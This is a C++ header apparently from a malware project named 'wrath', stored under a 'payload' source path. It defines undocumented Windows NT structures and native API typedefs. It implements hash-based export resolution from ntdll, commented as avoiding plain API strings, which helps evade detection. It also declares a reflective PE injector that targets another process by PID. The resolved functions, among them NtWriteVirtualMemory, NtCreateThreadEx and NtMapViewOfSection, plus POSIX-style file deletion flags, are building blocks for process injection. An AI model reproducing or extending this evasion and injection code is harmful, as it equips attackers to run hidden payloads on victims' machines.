#pragma once
#ifndef WRATH_CORE_NT_H
#define WRATH_CORE_NT_H

#include <windows.h>
#include <winternl.h>
#include <cstdint>
#include <cstddef>

#include "payload/src/core/hash.h"

namespace wrath::core::nt {

using NTSTATUS = LONG;

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((::wrath::core::nt::NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
constexpr NTSTATUS STATUS_SUCCESS = 0x00000000;
#endif
#ifndef STATUS_INFO_LENGTH_MISMATCH
constexpr NTSTATUS STATUS_INFO_LENGTH_MISMATCH = static_cast<NTSTATUS>(0xC0000004);
#endif
#ifndef STATUS_BUFFER_TOO_SMALL
constexpr NTSTATUS STATUS_BUFFER_TOO_SMALL = static_cast<NTSTATUS>(0xC0000023);
#endif
#ifndef STATUS_NO_MORE_ENTRIES
constexpr NTSTATUS STATUS_NO_MORE_ENTRIES = static_cast<NTSTATUS>(0x8000001A);
#endif

typedef struct _CLIENT_ID_EX {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID_EX, *PCLIENT_ID_EX;

typedef struct _FILE_BASIC_INFORMATION {
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    ULONG FileAttributes;
} FILE_BASIC_INFORMATION, *PFILE_BASIC_INFORMATION;

// ─────────────────────────────────────────────────────────────────────────────
// Structures & Enums
// ─────────────────────────────────────────────────────────────────────────────

enum class WaitReason : uint32_t {
    Executive = 0,
    FreePage = 1,
    PageIn = 2,
    PoolAllocation = 3,
    DelayExecution = 4,
    Suspended = 5,
    UserRequest = 6,
    WrExecutive = 7,
    WrFreePage = 8,
    WrPageIn = 9,
    WrPoolAllocation = 10,
    WrDelayExecution = 11,
    WrSuspended = 12,
    WrUserRequest = 13,
    WrEventPair = 14,
    WrQueue = 15,
    WrLpcReceive = 16,
    WrLpcReply = 17,
    WrVirtualMemory = 18,
    WrPageOut = 19,
    WrRendezvous = 20,
    Spare2 = 21,
    Spare3 = 22,
    Spare4 = 23,
    Spare5 = 24,
    WrCalloutStack = 25,
    WrKernel = 26,
    WrResource = 27,
    WrPushLock = 28,
    WrMutex = 29,
    WrQuantumEnd = 30,
    WrDispatchInt = 31,
    WrPreempted = 32,
    WrYieldExecution = 33,
    WrFastMutex = 34,
    WrGuardedMutex = 35,
    WrRundown = 36,
    MaximumWaitReason = 37
};

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

#pragma pack(push, 8)

struct SYSTEM_THREAD_INFORMATION_EX {
    LARGE_INTEGER KernelTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER CreateTime;
    ULONG WaitTime;
    PVOID StartAddress;
    CLIENT_ID ClientId;
    LONG Priority;
    LONG BasePriority;
    ULONG ContextSwitches;
    ULONG ThreadState;
    WaitReason WaitReason;
    ULONG Reserved;
};

struct SYSTEM_PROCESS_INFORMATION_EX {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG NumberOfThreadsHighWatermark;
    ULONGLONG CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    LONG BasePriority;
    HANDLE UniqueProcessId;
    HANDLE InheritedFromUniqueProcessId;
    ULONG HandleCount;
    ULONG SessionId;
    ULONG_PTR UniqueProcessKey;
    SIZE_T PeakVirtualSize;
    SIZE_T VirtualSize;
    ULONG PageFaultCount;
    SIZE_T PeakWorkingSetSize;
    SIZE_T WorkingSetSize;
    SIZE_T QuotaPeakPagedPoolUsage;
    SIZE_T QuotaPagedPoolUsage;
    SIZE_T QuotaPeakNonPagedPoolUsage;
    SIZE_T QuotaNonPagedPoolUsage;
    SIZE_T PagefileUsage;
    SIZE_T PeakPagefileUsage;
    SIZE_T PrivatePageCount;
    LARGE_INTEGER ReadOperationCount;
    LARGE_INTEGER WriteOperationCount;
    LARGE_INTEGER OtherOperationCount;
    LARGE_INTEGER ReadTransferCount;
    LARGE_INTEGER WriteTransferCount;
    LARGE_INTEGER OtherTransferCount;
    SYSTEM_THREAD_INFORMATION_EX Threads[1];
};

struct LDR_DATA_TABLE_ENTRY_EX {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT ObsoleteLoadCount;
    USHORT TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
    PVOID EntryPointActivationContext;
    PVOID Lock;
    PVOID DdagNode;
    LIST_ENTRY NodeModuleLink;
    PVOID LoadContext;
    PVOID ParentDllBase;
    PVOID SwitchBackContext;
};

struct PEB_LDR_DATA_EX {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
};

struct PEB_EX {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union {
        BOOLEAN BitField;
        struct {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PEB_LDR_DATA_EX* Ldr;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
};

#pragma pack(pop)

// File disposition flags for POSIX unlink
#ifndef FILE_DISPOSITION_FLAG_DELETE
#define FILE_DISPOSITION_FLAG_DELETE 0x00000001
#endif
#ifndef FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
#define FILE_DISPOSITION_FLAG_POSIX_SEMANTICS 0x00000002
#endif

typedef struct _FILE_DISPOSITION_INFORMATION_EX {
    ULONG Flags;
} FILE_DISPOSITION_INFORMATION_EX, *PFILE_DISPOSITION_INFORMATION_EX;

// ─────────────────────────────────────────────────────────────────────────────
// Function Prototypes & Typedefs
// ─────────────────────────────────────────────────────────────────────────────

using fnNtQuerySystemInformation = NTSTATUS(NTAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

using fnNtQueryInformationProcess = NTSTATUS(NTAPI*)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

using fnNtQueryInformationThread = NTSTATUS(NTAPI*)(
    HANDLE ThreadHandle,
    ULONG ThreadInformationClass,
    PVOID ThreadInformation,
    ULONG ThreadInformationLength,
    PULONG ReturnLength
);

using fnNtQueryInformationFile = NTSTATUS(NTAPI*)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    ULONG FileInformationClass
);

using fnNtSetInformationFile = NTSTATUS(NTAPI*)(
    HANDLE FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    ULONG FileInformationClass
);

using fnNtCreateSection = NTSTATUS(NTAPI*)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
);

using fnNtMapViewOfSection = NTSTATUS(NTAPI*)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
);

using fnNtUnmapViewOfSection = NTSTATUS(NTAPI*)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

using fnNtReadVirtualMemory = NTSTATUS(NTAPI*)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead
);

using fnNtWriteVirtualMemory = NTSTATUS(NTAPI*)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

using fnNtProtectVirtualMemory = NTSTATUS(NTAPI*)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

using fnNtAllocateVirtualMemory = NTSTATUS(NTAPI*)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

using fnNtFreeVirtualMemory = NTSTATUS(NTAPI*)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
);

using fnNtOpenProcess = NTSTATUS(NTAPI*)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    CLIENT_ID* ClientId
);

using fnNtClose = NTSTATUS(NTAPI*)(
    HANDLE Handle
);

using fnNtGetNextThread = NTSTATUS(NTAPI*)(
    HANDLE ProcessHandle,
    HANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    ULONG HandleAttributes,
    ULONG Flags,
    PHANDLE NewThreadHandle
);

using fnNtSuspendThread = NTSTATUS(NTAPI*)(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
);

using fnNtResumeThread = NTSTATUS(NTAPI*)(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
);

using fnRtlExitUserThread = VOID(NTAPI*)(
    NTSTATUS ExitStatus
);

using fnNtCreateThreadEx = NTSTATUS(NTAPI*)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

// ─────────────────────────────────────────────────────────────────────────────
// Dynamic API Resolver via Export Hash (No plain string APIs)
// ─────────────────────────────────────────────────────────────────────────────

inline PVOID resolve_export_hash(HMODULE module_base, hash_t fn_hash) {
    if (!module_base) return nullptr;
    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(module_base);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;
    auto* nt = reinterpret_cast<const IMAGE_NT_HEADERS*>(reinterpret_cast<const uint8_t*>(module_base) + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

    const auto& export_dir_entry = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (export_dir_entry.VirtualAddress == 0 || export_dir_entry.Size == 0) return nullptr;

    auto* exp = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(
        reinterpret_cast<const uint8_t*>(module_base) + export_dir_entry.VirtualAddress
    );

    const auto* functions = reinterpret_cast<const uint32_t*>(
        reinterpret_cast<const uint8_t*>(module_base) + exp->AddressOfFunctions
    );
    const auto* names = reinterpret_cast<const uint32_t*>(
        reinterpret_cast<const uint8_t*>(module_base) + exp->AddressOfNames
    );
    const auto* ordinals = reinterpret_cast<const uint16_t*>(
        reinterpret_cast<const uint8_t*>(module_base) + exp->AddressOfNameOrdinals
    );

    for (uint32_t i = 0; i < exp->NumberOfNames; ++i) {
        const char* name = reinterpret_cast<const char*>(
            reinterpret_cast<const uint8_t*>(module_base) + names[i]
        );
        if (fnv1a(name) == fn_hash) {
            uint16_t ord = ordinals[i];
            return const_cast<void*>(reinterpret_cast<const void*>(
                reinterpret_cast<const uint8_t*>(module_base) + functions[ord]
            ));
        }
    }
    return nullptr;
}

inline HMODULE get_ntdll_base() {
    static HMODULE ntdll = nullptr;
    if (!ntdll) {
        ntdll = GetModuleHandleW(L"ntdll.dll");
    }
    return ntdll;
}

#define DECLARE_NT_FN(name) \
    inline fn##name get_##name() { \
        static fn##name fn = reinterpret_cast<fn##name>( \
            ::wrath::core::nt::resolve_export_hash(::wrath::core::nt::get_ntdll_base(), ::wrath::core::fnv1a(#name)) \
        ); \
        return fn; \
    }

DECLARE_NT_FN(NtQuerySystemInformation)
DECLARE_NT_FN(NtQueryInformationProcess)
DECLARE_NT_FN(NtQueryInformationThread)
DECLARE_NT_FN(NtQueryInformationFile)
DECLARE_NT_FN(NtSetInformationFile)
DECLARE_NT_FN(NtCreateSection)
DECLARE_NT_FN(NtMapViewOfSection)
DECLARE_NT_FN(NtUnmapViewOfSection)
DECLARE_NT_FN(NtReadVirtualMemory)
DECLARE_NT_FN(NtWriteVirtualMemory)
DECLARE_NT_FN(NtProtectVirtualMemory)
DECLARE_NT_FN(NtAllocateVirtualMemory)
DECLARE_NT_FN(NtFreeVirtualMemory)
DECLARE_NT_FN(NtOpenProcess)
DECLARE_NT_FN(NtClose)
DECLARE_NT_FN(NtGetNextThread)
DECLARE_NT_FN(NtSuspendThread)
DECLARE_NT_FN(NtResumeThread)
DECLARE_NT_FN(RtlExitUserThread)
DECLARE_NT_FN(NtCreateThreadEx)

#undef DECLARE_NT_FN

// In-memory pure reflective injector declaration
bool nt_inject(DWORD pid, const uint8_t* raw_pe, size_t pe_len, std::wstring* out_err = nullptr);

} // namespace wrath::core::nt

#endif // WRATH_CORE_NT_H
